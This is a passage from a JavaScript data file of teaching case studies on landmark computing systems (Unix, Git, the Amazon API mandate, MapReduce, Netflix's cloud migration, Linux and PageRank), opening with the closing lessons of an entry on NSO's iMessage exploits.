    { t: "2022", d: "Apple introduces Lockdown Mode — a hardened configuration that disables attack surfaces like iMessage link previews." }
  ] },

  { h: "What it means for engineers" },
  { l: [
   "**Attack surface reduction matters.** Every feature that processes untrusted input is an attack surface. iMessage's rich preview of images and links is a convenience feature that became an exploitation path.",
   "**Memory safety is a security property.** The exploited vulnerabilities were in C/C++ parsing code. Memory-safe languages eliminate this class of bug.",
   "**Sandboxing is necessary but insufficient.** The iMessage sandbox contained the initial exploit; additional exploits escaped it. Defence in depth means assuming each layer will be broken.",
   "**Zero-day economics are real.** NSO Group reportedly charged governments $500,000 per target. At that price point, finding zero-days is a business, not a hobby.",
   "**Apple's Lockdown Mode** is the first mainstream acknowledgement that maximum security requires reducing functionality — turning off features to reduce attack surface."
  ] }
 ],
 k: [
  "Zero-click means the target cannot protect themselves through behaviour — the device is compromised by receiving a message.",
  "Every parser that processes untrusted input is an attack surface, and the more complex the format, the larger the surface.",
  "The market for zero-day exploits is a mature industry with nation-state customers and six-figure prices.",
  "Defence in depth must assume each layer will be breached — sandbox escape is a standard exploit technique."
 ],
 r: ["Zero-Day", "Sandboxing", "Memory Safety", "Encryption", "Authentication", "Endpoint", "Defence in Depth"],
 src: [
  { t: "Citizen Lab — The Million Dollar Dissident: NSO Group's iPhone Zero-Days used against a UAE Human Rights Defender", u: "https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/" },
  { t: "Google Project Zero — A deep dive into an NSO zero-click iMessage exploit (FORCEDENTRY)", u: "https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" }
 ]
}

]);


/* data/studies/03-systems.js */
/* Case studies — Landmark Systems. */
TD.addStudies("systems", [

{
 t: "Unix and the Bell Labs Philosophy",
 s: "Do one thing well, and connect it with a pipe",
 y: 1969, when: "1969 onwards",
 g: ["unix", "composition", "c", "portability"],
 tldr: "Two researchers at Bell Labs, freed by the failure of a much more ambitious project, built a small operating system on a spare machine. Its ideas — small programs that do one thing, text as the universal interface, and pipes to connect them — plus the decision to rewrite it in C so it could be moved between machines, produced the lineage that now runs almost every server, phone and container on earth.",
 say: [
  "The philosophy in one line: write programs that do one thing well, and that work together, using text streams as the interface.",
  "The move that actually mattered was rewriting it in C in 1973 — that made the OS portable, which had never really been true before.",
  "Pipes are the whole idea in one character: `|` lets you compose tools that were never written with each other in mind.",
  "Linux, macOS, Android and iOS are all either Unix or Unix-shaped, which is why the same shell skills work everywhere."
 ],
 b: [
  { h: "The origin" },
  { p: "Bell Labs had been part of Multics, an ambitious time-sharing operating system project that was running late and growing complicated. Bell Labs withdrew in 1969. Ken Thompson, Dennis Ritchie and colleagues, now without a convenient computing environment, started building something far smaller on a little-used PDP-7." },
  { p: "The name was a pun — Multics was multiplexed, this was *Unics*, doing rather less. The constraint was real: tiny memory, a machine nobody else wanted, and no mandate. What emerged was shaped by having to be small." },

  { h: "The philosophy" },
  { p: "Doug McIlroy, who ran the research group, later summarised it in a form that has been quoted ever since:" },
  { q: "Write programs that do one thing and do it well. Write programs to work together. Write programs to handle text streams, because that is a universal interface.", by: "Doug McIlroy, Bell Labs" },
  { p: "The third clause is the one that makes the first two useful. If every tool reads and writes plain text, then any tool can feed any other tool, including combinations nobody anticipated. `grep` did not need to know `sort` existed." },
  { x: { lang: "bash", code:
"# four programs, none written with the others in mind,\n# answering a question none of them knows about\n\ncat access.log \\\n  | awk '{print $1}' \\\n  | sort \\\n  | uniq -c \\\n  | sort -rn \\\n  | head -10" } },
  { n: "McIlroy proposed pipes in 1973 and Thompson implemented them in an evening. The idea — connect the output of one process to the input of another, with the operating system handling buffering and scheduling — turned a collection of utilities into a composition system. It is arguably the highest ratio of consequence to implementation effort in computing history.",
    nt: "Pipes took one evening" },

  { h: "The decision that made it spread" },
  { p: "In 1973 Unix was rewritten in C, a language Ritchie had developed alongside it. Operating systems at the time were written in assembly, which tied them to one processor. A Unix written in a high-level language could be recompiled for a different machine with far less work." },
  { p: "That portability, combined with AT&T's regulatory position — which limited its ability to sell software commercially, so Unix was licensed cheaply to universities with source code — put Unix into a generation of computer science departments. The students who learned on it went on to build the industry, and the Berkeley variant (BSD) fed TCP/IP networking back into the ecosystem." },

  { h: "What survived, and what did not" },
  { l: [
   "**Survived:** the file abstraction, where devices, pipes and sockets are all things you open, read and write. The hierarchical filesystem. The shell as a programmable interface. Small composable tools. C.",
   "**Survived in spirit:** microservices are the Unix philosophy at network scale — small services with a narrow interface, composed. Containers do something similar for packaging. Kubernetes reads as an attempt to build pipes for distributed processes.",
   "**Did not survive:** *everything is text* strains when the data is structured. Modern tooling frequently reaches for JSON and dedicated parsers precisely because parsing loosely-formatted text with `awk` is fragile.",
   "**Actively criticised:** the terse naming and inconsistent flags that came from typing on slow terminals are a genuine usability cost that newer tools deliberately reject."
  ] },
  { p: "The philosophy is now applied more often as an argument than as a practice — plenty of software described as Unix-like is a monolith with a plugin system. But the underlying instinct, that a small thing with a clean interface outlives a large thing with a broad one, is the reason engineers still cite it." }
 ],
 k: [
  "A narrow interface is what allows composition you did not design for.",
  "Portability came from writing the system in a high-level language — a decision that looked like a performance sacrifice.",
  "Free access with source code to universities distributed the ideas more effectively than any product strategy.",
  "The philosophy scales up: microservices are the same argument about process boundaries instead of program boundaries."
 ],
 r: ["Operating System", "Kernel", "Shell", "Linux", "Compiler", "Microservices", "Container", "File System"],
 src: [
  { t: "Ritchie & Thompson — The UNIX Time-Sharing System, CACM (1974)", u: "https://dl.acm.org/doi/10.1145/361011.361061" },
  { t: "Eric S. Raymond — The Art of Unix Programming", u: "http://www.catb.org/~esr/writings/taoup/html/" }
 ]
},

{
 t: "Git in Ten Days",
 s: "A licence dispute, and the tool everyone now uses",
 y: 2005, when: "April 2005",
 g: ["version control", "linus torvalds", "data model", "distributed"],
 tldr: "The Linux kernel had been using BitKeeper, a commercial tool offered free to open source projects. When that arrangement collapsed in April 2005, Linus Torvalds wrote a replacement. The first commit was on 7 April; git was managing its own source that same day and the kernel within two weeks. Its design — content-addressed snapshots rather than file diffs — is why it is fast, and its interface is why everyone complains about it.",
 say: [
  "It exists because the kernel lost access to BitKeeper and Linus refused to go back to CVS.",
  "The core insight is that git stores snapshots addressed by the hash of their content, not diffs between files — which is why branching is instant.",
  "A branch is a 41-byte file containing a commit hash. That is the whole thing.",
  "Everyone agrees the data model is elegant and the command-line interface is not, which is why so many tools exist to sit on top of it."
 ],
 b: [
  { h: "Why it was written" },
  { p: "Kernel development had used BitKeeper since 2002. It was proprietary, but BitMover offered a free-of-charge licence to open source projects, and it was distributed — which mattered enormously for a project with thousands of contributors and a maintainer hierarchy." },
  { p: "The arrangement was politically uncomfortable for parts of the free software community from the start. In April 2005, after Andrew Tridgell demonstrated a tool that interoperated with BitKeeper by reverse-engineering its protocol, BitMover withdrew the free licence. The kernel was suddenly without version control." },
  { p: "The alternatives at the time were centralised (CVS, Subversion) or distributed but slow (Monotone, Darcs). Torvalds' requirements were unusual: it had to handle a very large tree, merge quickly, support a distributed workflow with a chain of trust, and be fast enough that a maintainer could apply hundreds of patches a day." },

  { h: "Ten days" },
  { tl: [
    { t: "3 Apr 2005", d: "Torvalds begins writing code." },
    { t: "7 Apr 2005", d: "First commit. Git is self-hosting — its own source is stored in git — the same day." },
    { t: "17 Apr 2005", d: "Git performs its first multi-branch merge." },
    { t: "16 Jun 2005", d: "The kernel 2.6.12 release is managed with git." },
    { t: "26 Jul 2005", d: "Torvalds hands maintainership to Junio Hamano, who still leads the project." }
  ] },
  { n: "The ten-day figure refers to reaching a usable core, not a finished product. What existed after ten days was a fast content-addressable object store with the plumbing commands to build on — the porcelain most people use came later, from many contributors. The speed was possible because the data model is genuinely simple.",
    nt: "What *ten days* actually means" },

  { h: "The data model" },
  { p: "Git stores four kinds of object, each addressed by the SHA hash of its contents:" },
  { l: [
   "**Blob** — the contents of a file. No name, no history, just bytes.",
   "**Tree** — a directory listing: names mapped to blob or tree hashes.",
   "**Commit** — a pointer to one tree (the whole project state), plus parent commit hashes, author, and message.",
   "**Tag** — a named pointer to an object, optionally signed."
  ] },
  { p: "Because a commit points at a complete tree, a commit is a **snapshot**, not a diff. Diffs are computed on demand when you ask for them. Because every object is addressed by the hash of its content, identical files are stored once, and any change to history changes every hash downstream of it — which is where git's integrity guarantee comes from, and why rewriting shared history is so disruptive." },
  { x: { lang: "bash", code:
"# a branch really is just a file with a hash in it\n$ cat .git/refs/heads/main\n9f2c1a7e5b3d8f04c6e21b9a7d3f5c8e10b4a6d2\n\n# which is why creating one is instantaneous\n$ git branch experiment" } },

  { h: "The interface problem" },
  { p: "Git's commands were originally the plumbing — low-level operations exposing the object model directly. The user-facing layer grew on top over years, by different people, without a single consistent design. The result is a tool where `checkout` did several unrelated jobs until `switch` and `restore` were added in 2019, and where the mental model must be learned before the commands make sense." },
  { p: "That is the usual complaint, and it is fair. It is also why learning the object model first — objects, refs, the index — converts git from arbitrary incantations into something predictable." },

  { h: "What it changed" },
  { p: "Distributed version control won completely. Every clone holding full history made forking cheap, which made GitHub's model — fork, change, pull request — possible, which reshaped how open source collaboration works. The pull request is arguably a bigger cultural artefact than git itself, and it only exists because branching and merging became cheap." }
 ],
 k: [
  "Content addressing gives integrity and deduplication as a side effect of the storage design.",
  "A commit is a snapshot of the whole tree; diffs are computed, not stored.",
  "Branching is cheap because a branch is a pointer, which is what made the fork-and-pull-request workflow viable.",
  "An elegant data model does not guarantee an elegant interface — learn the model and the commands stop being arbitrary."
 ],
 r: ["Git", "Version Control", "Commit", "Branch", "Merge", "Hashing", "Pull Request", "Open Source"],
 src: [
  { t: "Git — official documentation and history", u: "https://git-scm.com/book/en/v2/Getting-Started-A-Short-History-of-Git" },
  { t: "Linus Torvalds — initial git commit, 7 April 2005", u: "https://github.com/git/git/commit/e83c5163316f89bfbde7d9ab23ca2e25604af290" }
 ]
},

{
 t: "The Bezos API Mandate",
 s: "An org chart change that produced AWS",
 y: 2002, when: "around 2002",
 g: ["architecture", "conway's law", "service oriented", "amazon"],
 tldr: "Amazon reportedly issued an internal instruction that all teams must expose their data and functionality through service interfaces, communicate only through those interfaces, and design every one of them to be externalisable. It was deeply unpopular and took years. The result was an organisation that was already a set of composable services when it decided to sell infrastructure — which is a large part of why AWS existed years before its competitors.",
 say: [
  "The mandate was that teams talk to each other only through service interfaces — no shared databases, no back doors, no linking directly to another team's code.",
  "The clause that mattered was *all interfaces must be designed to be externalisable* — building for an outside customer from day one.",
  "It is the best-known example of the inverse Conway manoeuvre: change the organisation to force the architecture.",
  "Worth knowing that the widely-quoted text comes from Steve Yegge's 2011 post, not an official Amazon document."
 ],
 b: [
  { h: "The mandate" },
  { p: "The version everyone quotes comes from a long internal post by Steve Yegge in 2011, written while he was at Google about his previous years at Amazon, which was accidentally shared publicly. It is a secondhand recollection written years afterwards, not a leaked document — worth stating plainly, because it is usually quoted as though it were the memo itself." },
  { p: "As Yegge recalled it, the instruction was roughly:" },
  { l: [
   "All teams will expose their data and functionality through service interfaces.",
   "Teams must communicate with each other through those interfaces — no direct database reads, no shared memory, no back doors of any kind.",
   "The technology used does not matter: HTTP, CORBA, custom protocols, whatever.",
   "All service interfaces without exception must be designed from the ground up to be externalisable — able to be exposed to developers outside the company.",
   "Anyone who does not do this will be fired."
  ] },

  { h: "Why the fourth point is the whole thing" },
  { p: "The first three describe service-oriented architecture, which was not a new idea in 2002. The fourth changes the engineering standard entirely. An internal interface can be sloppy: undocumented, unversioned, authenticated by being on the same network, and freely broken by a coordinated deploy." },
  { p: "An interface designed to be externalisable cannot be any of those things. It needs documentation, versioning, authentication, authorisation, rate limiting, metering, error contracts and backwards compatibility — because the consumer might be a stranger you cannot coordinate a deploy with." },
  { n: "Every team was therefore forced to build the operational maturity of a public API provider before there was any public API. When Amazon later decided to sell compute and storage, it did not need to build a services company — it already was one. Competitors starting from a monolith had to do the hard part first, which is a plausible explanation for a multi-year head start.",
    nt: "The head start was accidental" },

  { h: "The cost" },
  { p: "Accounts of the period describe it as brutal. Turning direct database access into service calls means latency where there was none, distributed failure modes where there were none, and a great deal of work that produces no customer-visible feature. Yegge's own post is at least as much a complaint about Amazon as a compliment." },
  { l: [
   "Every previously-free in-process call became a network call that can time out, retry, or partially fail.",
   "Debugging moved from a stack trace to correlating logs across services — which is why distributed tracing had to be invented.",
   "Teams needed on-call rotations, SLAs and monitoring for interfaces that had previously been function calls."
  ] },

  { h: "Conway's Law, used deliberately" },
  { p: "Conway's Law observes that systems mirror the communication structures of the organisations that build them. The mandate is the *inverse* manoeuvre: rather than accepting the architecture your org chart produces, change the communication structure to force the architecture you want." },
  { p: "That is why this story is quoted in architecture discussions far more often than in Amazon history. If teams share a database, you will get a distributed monolith regardless of what the diagram says, because the cheapest path is always the back door. Removing the back door is an organisational act, not a technical one." },
  { n: "The mandate is frequently cited to justify splitting a small company's product into microservices. That is usually the wrong lesson. Amazon had thousands of engineers and an organisational coordination problem; a team of fifteen has neither, and pays all of the distributed-systems cost for none of the benefit. The transferable idea is the discipline of a real interface, which a modular monolith can also enforce.",
    nt: "The common misapplication" }
 ],
 k: [
  "Designing every internal interface as though an outsider will consume it forces real operational maturity.",
  "Removing back doors — shared databases, direct table reads — is what actually enforces service boundaries.",
  "You can change architecture by changing the organisation; this is Conway's Law used deliberately.",
  "The cost is paid in latency, partial failure and observability work before any benefit appears."
 ],
 r: ["API", "Microservices", "Monolith", "REST", "Distributed System", "Distributed Tracing", "Rate Limiting", "Semantic Versioning"],
 src: [
  { t: "Steve Yegge — Google Platforms Rant (2011), the source of the widely-quoted version", u: "https://gist.github.com/chitchcock/1281611" }
 ]
},

{
 t: "MapReduce and the Hadoop Lineage",
 s: "Google published the papers, not the code",
 y: 2004, when: "2003–2006",
 g: ["big data", "distributed", "google", "hadoop"],
 tldr: "Google published three papers describing how it stored and processed data at a scale nobody else was operating at — GFS, MapReduce and Bigtable — while keeping the implementations internal. Outside engineers reimplemented them as Hadoop and HBase, which created the entire big data industry. By the time Hadoop was at peak adoption, Google had already moved on to the systems that replaced it internally.",
 say: [
  "The core idea was to move the computation to the data instead of moving petabytes across the network, on cheap machines that are expected to fail.",
  "Google published the papers without the code; Doug Cutting and Mike Cafarella built Hadoop from them, and Yahoo scaled it.",
  "Almost nobody starts a Hadoop cluster now — object storage plus elastic compute replaced it — but the vocabulary is still everywhere.",
  "Its lasting legacy is separating storage from compute, which is the opposite of Hadoop's original premise about data locality."
 ],
 b: [
  { h: "The problem" },
  { p: "By the early 2000s Google was indexing the web on a scale where single machines were irrelevant and reliable hardware was uneconomic. The design assumption became: build on cheap commodity machines, assume several are broken at any moment, and handle that in software rather than paying for reliable hardware." },
  { p: "Three papers described the resulting stack:" },
  { l: [
   "**GFS (2003)** — a distributed filesystem splitting huge files into large chunks replicated across machines, optimised for streaming reads and appends rather than random writes.",
   "**MapReduce (2004)** — a programming model where computation is expressed as a map phase that runs independently on each chunk and a reduce phase that aggregates. The framework handles distribution, retries and failed machines.",
   "**Bigtable (2006)** — a sparse, distributed, sorted map for structured data at scale, which is a direct ancestor of HBase, Cassandra and much of the wide-column NoSQL family."
  ] },
  { n: "The genuinely important design move was **moving computation to the data**. Rather than pulling terabytes across the network to a compute cluster, the scheduler tries to run each map task on the machine that already holds that chunk. In 2004, when network bandwidth was the binding constraint, this was the difference between feasible and impossible.",
    nt: "Why locality mattered then" },

  { h: "The reimplementation" },
  { p: "Doug Cutting and Mike Cafarella were building Nutch, an open source web crawler, and hitting exactly the scaling problems the papers described. They implemented the ideas, and in 2006 the storage and processing parts were split out as Hadoop — named after Cutting's son's toy elephant. Yahoo hired Cutting and put serious engineering behind it, running clusters of thousands of nodes." },
  { p: "Hadoop created an industry. Cloudera, Hortonworks and MapR were built on it, enterprises stood up clusters, and *big data* became a job title. An ecosystem grew on top: Hive for SQL, Pig for dataflow, HBase for the Bigtable model, ZooKeeper for coordination, and later Spark, which kept intermediate data in memory and made iterative work an order of magnitude faster." },

  { h: "Why it faded" },
  { p: "Hadoop's core premise was that storage and compute should live on the same machines, because moving data was expensive. Two things undermined that." },
  { l: [
   "**Network got faster.** Data centre bandwidth grew faster than the assumption held. Reading from network storage stopped being the bottleneck it had been.",
   "**Object storage got cheap and infinite.** S3 and its equivalents offered durability and elasticity that a self-managed HDFS cluster could not match at a comparable cost or operational burden.",
   "**Coupled scaling is wasteful.** If storage and compute are on the same nodes, needing more storage means buying CPUs you will not use, and vice versa. Separating them lets each scale independently, and lets compute be shut down entirely when idle.",
   "**Operating it was expensive.** Running a large Hadoop cluster required a dedicated team. Managed cloud services removed that job."
  ] },
  { p: "MapReduce as a programming model was also more restrictive than people wanted. Expressing everything as map and reduce is awkward for iterative algorithms and interactive queries, which is exactly the gap Spark and then warehouse SQL engines filled." },

  { h: "What actually survived" },
  { p: "Almost everything except the implementation. Distributed processing over partitioned data, fault tolerance through retries and replication, the shuffle as the expensive phase, data skew as the recurring failure mode, and the columnar file formats that came out of the ecosystem — Parquet and ORC — are all still central. Spark, Trino, BigQuery, Snowflake and Databricks are all descendants." },
  { p: "The strategic lesson is separate: Google published the ideas and kept the implementations, and got a decade in which competitors reimplemented its 2004 architecture while it built the next one." }
 ],
 k: [
  "Assume commodity hardware fails and handle it in software — this is now the default, not a novelty.",
  "Data locality was a response to a bandwidth constraint that later stopped binding.",
  "Separating storage from compute lets each scale independently, which reversed Hadoop's founding premise.",
  "Publishing the architecture while keeping the implementation is a viable strategic position."
 ],
 r: ["MapReduce", "Hadoop", "HDFS", "Apache Spark", "Object Storage", "Partitioning", "Data Skew", "Parquet"],
 src: [
  { t: "Dean & Ghemawat — MapReduce: Simplified Data Processing on Large Clusters (2004)", u: "https://research.google/pubs/pub62/" },
  { t: "Ghemawat, Gobioff & Leung — The Google File System (2003)", u: "https://research.google/pubs/pub51/" }
 ]
},

{
 t: "Netflix on AWS",
 s: "Seven years, and a monkey that breaks production",
 y: 2016, when: "2008–2016",
 g: ["cloud migration", "chaos engineering", "resilience", "microservices"],
 tldr: "A database corruption in 2008 stopped Netflix shipping DVDs for three days. The conclusion was not to buy better hardware but to abandon vertically-scaled databases entirely and rebuild on horizontally scalable cloud infrastructure. The migration took seven years. Along the way they built Chaos Monkey, which deliberately kills production servers during working hours, on the reasoning that failures you cause on purpose are far cheaper than the ones that arrive at 3am.",
 say: [
  "It started with a three-day outage in 2008 that stopped DVD shipping, not with a cloud strategy.",
  "It took seven years and was a rewrite, not a lift-and-shift — they explicitly refused to move the old architecture.",
  "Chaos Monkey randomly terminates production instances during office hours, so failure happens when engineers are awake and watching.",
  "The principle is designing for failure rather than trying to prevent it, which is now standard in any distributed system."
 ],
 b: [
  { h: "The trigger" },
  { p: "In August 2008, database corruption in Netflix's data centre prevented the company from shipping DVDs for three days. At the time the business was DVD-by-post with a growing streaming service, and the outage was an existential embarrassment." },
  { p: "The analysis concluded that the problem was architectural. They were running vertically scaled relational databases with single points of failure — the standard enterprise pattern — and making that more reliable meant buying progressively more expensive hardware while never removing the fundamental fragility." },

  { h: "The decision" },
  { p: "Netflix chose to move to AWS, and to rebuild rather than migrate. The distinction was deliberate and it is the reason the project took seven years." },
  { l: [
   "Monolithic applications were decomposed into hundreds of services, each independently deployable and independently scalable.",
   "Vertically scaled Oracle databases were replaced with horizontally scalable stores, principally Cassandra, accepting eventual consistency where the business could tolerate it.",
   "Every service was designed on the assumption that its dependencies would fail — timeouts, retries with backoff, circuit breakers, and fallbacks that degrade rather than error.",
   "State was pushed out of application instances so any instance could be destroyed and replaced without consequence."
  ] },
  { tl: [
    { t: "Aug 2008", d: "Database corruption halts DVD shipping for three days." },
    { t: "2009–2010", d: "Streaming infrastructure begins moving to AWS. The first services go live." },
    { t: "2011", d: "Chaos Monkey is introduced, and later open-sourced as part of the Simian Army." },
    { t: "Dec 2012", d: "An AWS ELB outage on Christmas Eve affects Netflix streaming, driving further investment in multi-region resilience." },
    { t: "Jan 2016", d: "The final customer-facing service is migrated; the last data centre for streaming is shut down. Billing was among the last pieces." }
  ] },

  { h: "Chaos Monkey" },
  { p: "The reasoning is straightforward once stated. Cloud instances fail. If your system cannot survive an instance disappearing, you will discover that at the worst possible moment. So terminate instances continuously, deliberately, during business hours, when the whole team is awake and able to fix what breaks." },
  { q: "The best way to avoid failure is to fail constantly.", by: "Netflix engineering, on the Simian Army" },
  { p: "It grew into a family: Chaos Kong simulated the loss of an entire AWS region; Latency Monkey injected artificial delays and errors into service calls; later tools like FIT and ChAP ran controlled experiments on a fraction of live traffic with automatic abort conditions." },
  { n: "Chaos engineering is often adopted in the wrong order. Netflix built it *after* designing services to tolerate failure, and after having the monitoring to detect the consequences within seconds. Introducing random instance termination to a system that cannot survive it, and that you cannot observe, just produces outages. The prerequisite list is: redundancy, health checks, automated replacement, and monitoring you trust.",
    nt: "Do not start here" },

  { h: "What it cost, and what it bought" },
  { p: "The bought part is well documented: Netflix scaled to well over a hundred million subscribers on infrastructure that grows elastically, deploys thousands of times a day, and routinely loses instances without customer impact. Regional failover became a practised operation rather than a theoretical plan." },
  { p: "The cost is less often quoted. Seven years of engineering effort, a period of running two architectures simultaneously, and the permanent complexity of a large distributed system — which is why Netflix also had to build a great deal of its own tooling for tracing, dependency management and deployment, much of which was open-sourced because nothing comparable existed." },
  { p: "The honest summary is that this was the right answer for a company whose scale and failure cost justified it. It is quoted constantly by organisations at a scale where a well-run pair of database servers would serve them better for a decade." }
 ],
 k: [
  "Designing for failure is cheaper than trying to prevent it once the system is large enough.",
  "A cloud migration that carries the old architecture across yields the old failure modes at higher cost.",
  "Deliberate failure injection belongs after redundancy and observability, not before.",
  "The scale that justified this is unusual — the practices transfer better than the architecture does."
 ],
 r: ["Chaos Engineering", "Microservices", "High Availability", "Circuit Breaker", "Graceful Degradation", "Eventual Consistency", "Autoscaling", "Distributed Tracing"],
 src: [
  { t: "Netflix Technology Blog — Completing the Netflix Cloud Migration", u: "https://about.netflix.com/en/news/completing-the-netflix-cloud-migration" },
  { t: "Principles of Chaos Engineering", u: "https://principlesofchaos.org/" }
 ]
},

{
 t: "The Linux Kernel",
 s: "A student project that runs the world",
 y: 1991, when: "1991 onwards",
 g: ["linux", "open source", "kernel", "community"],
 tldr: "A 21-year-old Finnish student posted a message to a Usenet newsgroup announcing a free operating system kernel he was working on as a hobby. Three decades later, Linux runs over 90% of servers, all of the world's top 500 supercomputers, every Android phone, and the majority of cloud infrastructure. It is maintained by thousands of contributors coordinated through a mailing-list-based workflow that Linus Torvalds still personally manages at the top level.",
 say: [
  "Torvalds' original post said it was 'just a hobby, won't be big and professional like GNU' — it now runs most of the internet.",
  "The kernel is monolithic, not microkernel — the famous Tanenbaum-Torvalds debate. Pragmatism won.",
  "It is the largest collaborative software project in human history: over 20,000 contributors from 1,700+ companies.",
  "The development model — mailing lists, subsystem maintainers, Torvalds as a final merge bottleneck — is unusual and works at a scale that shouldn't."
 ],
 b: [
  { h: "The origin" },
  { q: "I'm doing a (free) operating system (just a hobby, won't be big and professional like gnu) for 386(486) AT clones.", by: "Linus Torvalds, comp.os.minix, 25 August 1991" },
  { p: "Torvalds was a computer science student at the University of Helsinki. He was using MINIX, Andrew Tanenbaum's teaching operating system, and wanted something more capable. He started writing his own kernel targeting the Intel 386 processor, initially just a terminal emulator that could talk to his university's mainframe." },
  { p: "The kernel was released under the GPL in 1992, which meant anyone could use, modify and redistribute it — but had to share modifications under the same licence. That decision, combined with the growing GNU toolchain that provided everything except a kernel, created a complete free operating system." },

  { h: "The architecture debate" },
  { p: "In January 1992, Andrew Tanenbaum posted that Linux was obsolete because it used a monolithic kernel architecture. Tanenbaum advocated microkernels, where drivers and filesystems run in user space and communicate through message passing. Torvalds argued that monolithic kernels were faster and simpler." },
  { l: [
   "**Monolithic (Linux).** All kernel code runs in one address space with direct function calls. Faster, but a bug in any driver can crash the entire system.",
   "**Microkernel (Mach, MINIX 3, QNX).** Minimal kernel, with drivers in user space. More robust and modular, but message-passing overhead.",
   "**Pragmatic winner.** Linux won not because the architecture was theoretically superior but because it shipped, worked, and attracted contributors. Torvalds was willing to sacrifice elegance for functionality."
  ] },
  { n: "The debate is studied in every OS course. The honest summary: microkernels have theoretical advantages in reliability and modularity, and Linux has the entire market. The engineering lesson is that a working system you can improve beats a correct design you cannot ship.",
    nt: "The debate that never ended" },

  { h: "The development model" },
  { l: [
   "**Subsystem maintainers.** The kernel is divided into subsystems (networking, filesystems, drivers, memory management), each with a maintainer who reviews and merges patches for their area.",
   "**Mailing list workflow.** Patches are submitted as emails to relevant mailing lists. Review happens publicly in replies. There is no GitHub-style pull request interface.",
   "**Torvalds as final integrator.** Subsystem maintainers send pull requests to Torvalds, who merges them into the mainline during merge windows. His review is the final gate.",
   "**Release cadence.** A new kernel version ships roughly every 9–10 weeks: a two-week merge window followed by 7–8 weeks of stabilisation (rc1 through rc7).",
   "**Scale.** The 6.x kernel has roughly 30 million lines of code. The 5.10 release had contributions from over 1,900 developers at 200+ companies."
  ] },

  { h: "Where it runs" },
  { l: [
   "**Servers:** 90%+ of cloud workloads, including all of AWS, GCP and Azure's Linux VMs.",
   "**Supercomputers:** all 500 of the TOP500 run Linux.",
   "**Mobile:** Android uses a modified Linux kernel — roughly 3 billion active devices.",
   "**Embedded:** routers, smart TVs, automotive infotainment, IoT devices.",
   "**Containers:** Docker and Kubernetes depend on Linux kernel features (namespaces, cgroups)."
  ] }
 ],
 k: [
  "A working system that ships beats a correct design that does not.",
  "Open source with a strong licence (GPL) created contributions from competitors because they all needed the same foundation.",
  "The development model scales through hierarchy and subsystem ownership, not through democracy.",
  "Kernel features (namespaces, cgroups) enabled containerisation, which reshaped how software is deployed."
 ],
 r: ["Kernel", "Operating System", "Linux", "Open Source", "Container", "Shell", "File System", "Process"],
 src: [
  { t: "Torvalds — original comp.os.minix post (25 August 1991)", u: "https://groups.google.com/g/comp.os.minix/c/dlNtH7RRrGA/m/SwRavCzVE7gJ" },
  { t: "The Linux Kernel Archives", u: "https://www.kernel.org/" }
 ]
},

{
 t: "Google's PageRank",
 s: "An eigenvalue problem that built a trillion-dollar company",
 y: 1998, when: "1996–1998",
 g: ["search", "graph algorithm", "linear algebra", "stanford"],
 tldr: "Two Stanford PhD students observed that the web is a directed graph and that the link structure contains information about page quality. Their algorithm, PageRank, modelled a random surfer following links and computed the stationary probability distribution — the eigenvalue problem on the web's adjacency matrix. The pages most likely to be reached by random walks were ranked highest. The result was dramatically better search, which became Google.",
 say: [
  "The core idea: a link from page A to page B is a vote, and a vote from an important page counts more. That is a recursive definition — importance is defined in terms of importance.",
  "Mathematically, it is the principal eigenvector of the web's link matrix — a linear algebra problem on a graph with billions of nodes.",
  "It turned search from keyword matching into a graph quality problem, which is why Google's results were so much better than AltaVista.",
  "It is the clearest example of a graph algorithm having direct, world-changing commercial impact."
 ],
 b: [
  { h: "The insight" },
  { p: "Before PageRank, search engines ranked pages primarily by text relevance — keyword frequency, metadata, and basic text analysis. The results were easily gamed and frequently irrelevant." },
  { p: "Larry Page and Sergey Brin, Stanford PhD students, observed that the link structure of the web carried quality signal. Academic citation works this way: a paper cited by many important papers is probably important. The web has links instead of citations, but the principle transfers." },
  { p: "The key insight was that importance is recursive: a page is important if important pages link to it. That circularity is not a problem — it is an eigenvalue problem." },

  { h: "The mathematics" },
  { p: "Model a random surfer who starts on a page and repeatedly clicks a random link on whatever page they are on. With probability d (the damping factor, usually 0.85), they follow a link; with probability 1−d, they jump to a random page anywhere on the web." },
  { x: { lang: "text", code:
"PageRank(p) = (1-d)/N + d × Σ PageRank(q) / L(q)\n                              for all q linking to p\n\nwhere:\n  N = total number of pages\n  d = damping factor (0.85)\n  L(q) = number of outbound links from page q\n\nIn matrix form: PR = (1-d)/N × 1 + d × M × PR\n\nThis is an eigenvector equation. The PageRank vector\nis the principal eigenvector of the modified adjacency\nmatrix M, computed iteratively via power iteration." } },
  { l: [
   "**Power iteration.** Start with uniform PageRank across all pages. Repeatedly multiply by the link matrix until convergence. This is how it was computed in practice — it converges in 50–100 iterations on the web.",
   "**Damping factor.** The 0.85 probability of following a link (versus random jump) prevents rank from concentrating in link sinks and ensures the Markov chain is ergodic.",
   "**Sparse matrix.** The web has billions of pages but each links to relatively few, so the matrix is extremely sparse — making the computation tractable."
  ] },
  { n: "This is the linear algebra from your B.Tech maths course applied at planetary scale. Eigenvalues, Markov chains, power iteration, sparse matrices — all of it shows up in one of the most commercially successful algorithms ever written. It is the strongest answer to 'when will I use this in real life'.",
    nt: "Your linear algebra course, applied" },

  { h: "From algorithm to company" },
  { tl: [
    { t: "1996", d: "Page and Brin begin the research project at Stanford, initially called BackRub." },
    { t: "1998", d: "The PageRank paper is published. Google is incorporated." },
    { t: "Early 2000s", d: "Google's search quality, driven by PageRank and subsequent improvements, rapidly gains market share." },
    { t: "2004", d: "Google IPO. The algorithm that started as a Stanford project underpins a company valued at $23 billion." }
  ] },
  { p: "PageRank alone did not make Google. It was combined with text relevance, anchor text analysis, and many subsequent signals. But it was the foundational insight: use the structure of the graph, not just the content of the nodes, to determine quality. That insight now shows up in social network analysis, recommendation systems, fraud detection and biological networks." }
 ],
 k: [
  "Link structure is a signal about quality — using the graph, not just the content, was the breakthrough.",
  "Recursive definitions of importance resolve as eigenvalue problems, computed by power iteration.",
  "Linear algebra at scale is not academic — eigenvalues, sparse matrices and Markov chains built a trillion-dollar company.",
  "The idea generalises: any graph where edges carry endorsement signal is amenable to the same approach."
 ],
 r: ["Graph", "Adjacency List", "Eigenvalue", "Markov Chain", "Hash Table", "Distributed System", "MapReduce"],
 src: [
  { t: "Page et al. — The PageRank Citation Ranking: Bringing Order to the Web (Stanford, 1998)", u: "http://ilpubs.stanford.edu:8090/422/1/1999-66.pdf" },
